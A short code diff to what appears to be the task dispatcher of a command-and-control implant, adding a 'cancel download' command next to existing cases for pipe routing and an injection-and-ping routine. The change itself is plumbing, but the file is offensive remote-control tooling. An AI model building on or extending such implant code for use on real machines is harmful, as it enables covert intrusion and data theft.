@@ -5,6 +5,7 @@
 #include "beacon.h"
 #include "channel.h"
 #include "command.h"
+#include "download.h"
 #include "filesystem.h"
 #include "identity.h"
 #include "link.h"
@@ -143,6 +144,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 			break;
 		case COMMAND_PIPE_ROUTE:
 			PipeRoute(buffer, size);
+			break;
+		case COMMAND_CANCEL_DOWNLOAD:
+			DownloadCancel(buffer, size);
 			break;
 		case COMMAND_INJECT_PING:
 			SpawnAndPing(buffer, size, TRUE);
